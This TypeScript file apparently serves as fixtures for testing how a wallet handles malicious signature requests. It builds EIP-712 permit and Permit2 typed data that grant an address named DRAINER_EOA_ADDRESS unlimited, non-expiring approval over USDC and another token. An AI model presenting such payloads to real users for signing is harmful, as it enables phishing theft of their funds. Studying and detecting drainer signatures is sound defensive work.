import { DRAINER_EOA_ADDRESS } from '@/config/constants'
import { BigNumber } from 'ethers'
import { hexZeroPad, _TypedDataEncoder } from 'ethers/lib/utils'

export type EIP712TypedData = ReturnType<typeof _TypedDataEncoder.getPayload>

export const hashTypedData = (typedData: EIP712TypedData): string => {
  // `ethers` doesn't require `EIP712Domain` and otherwise throws
  const { EIP712Domain: _, ...types } = typedData.types
  return _TypedDataEncoder.hash(typedData.domain, types, typedData.message)
}

const UNLIMITED_APPROVAL_AMOUNT = BigNumber.from(2).pow(160).sub(1)
const MAX_DEADLINE = BigNumber.from(2).pow(48).sub(1)
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

export const getPermitTypedData = (chainId: number, safeAddress: string) => {
  return {
    types: {
      EIP712Domain: [
        {
          name: 'name',
          type: 'string',
        },
        {
          name: 'chainId',
          type: 'uint256',
        },
        {
          name: 'version',
          type: 'string',
        },
        {
          name: 'verifyingContract',
          type: 'address',
        },
      ],
      Permit: [
        {
          name: 'owner',
          type: 'address',
        },
        {
          name: 'spender',
          type: 'address',
        },
        {
          name: 'value',
          type: 'uint256',
        },
        {
          name: 'nonce',
          type: 'uint256',
        },
        {
          name: 'deadline',
          type: 'uint256',
        },
      ],
    },
    domain: {
      name: 'USDC',
      version: '1',
      chainId: chainId,
      verifyingContract: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    },
    message: {
      owner: safeAddress,
      spender: DRAINER_EOA_ADDRESS,
      value: UNLIMITED_APPROVAL_AMOUNT.toString(),
      nonce: 0,
      deadline: MAX_DEADLINE.toString(),
    },
  }
}

export const getPermit2TypedData = (chainId: number) => {
  return {
    types: {
      EIP712Domain: [
        {
          name: 'name',
          type: 'string',
        },
        {
          name: 'chainId',
          type: 'uint256',
        },
        {
          name: 'verifyingContract',
          type: 'address',
        },
      ],
      PermitSingle: [
        {
          name: 'details',
          type: 'PermitDetails',
        },
        {
          name: 'spender',
          type: 'address',
        },
        {
          name: 'sigDeadline',
          type: 'uint256',
        },
      ],
      PermitDetails: [
        {
          name: 'token',
          type: 'address',
        },
        {
          name: 'amount',
          type: 'uint160',
        },
        {
          name: 'expiration',
          type: 'uint48',
        },
        {
          name: 'nonce',
          type: 'uint48',
        },
      ],
    },
    primaryType: 'PermitSingle',
    domain: {
      name: 'Permit2',
      chainId,
      verifyingContract: PERMIT2_ADDRESS,
    },
    message: {
      spender: DRAINER_EOA_ADDRESS,
      sigDeadline: MAX_DEADLINE.toString(),
      details: {
        token: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
        amount: UNLIMITED_APPROVAL_AMOUNT.toString(),
        expiration: MAX_DEADLINE.toString(),
        nonce: 0,
      },
    },
  }
}

export const getPermit2PermitBatchTypedData = (chainId: number) => {
  return {
    types: {
      EIP712Domain: [
        {
          name: 'name',
          type: 'string',
        },
        {
          name: 'chainId',
          type: 'uint256',
        },
        {
          name: 'verifyingContract',
          type: 'address',
        },
      ],
      PermitBatch: [
        {
          name: 'details',
          type: 'PermitDetails[]',
        },
        {
          name: 'spender',
          type: 'address',
        },
        {
          name: 'sigDeadline',
          type: 'uint256',
        },
      ],
      PermitDetails: [
        {
          name: 'token',
          type: 'address',
        },
        {
          name: 'amount',
          type: 'uint160',
        },
        {
          name: 'expiration',
          type: 'uint48',
        },
        {
          name: 'nonce',
          type: 'uint48',
        },
      ],
    },
    primaryType: 'PermitBatch',
    domain: {
      name: 'Permit2',
      chainId,
      verifyingContract: PERMIT2_ADDRESS,
    },
    message: {
      spender: DRAINER_EOA_ADDRESS,
      sigDeadline: MAX_DEADLINE.toString(),
      details: [
        {
          token: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
          amount: UNLIMITED_APPROVAL_AMOUNT.toString(),
          expiration: MAX_DEADLINE.toString(),
          nonce: 0,
        },
        {
          token: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
          amount: UNLIMITED_APPROVAL_AMOUNT.toString(),
          expiration: MAX_DEADLINE.toString(),
          nonce: 0,
        },
      ],
    },
  }
}
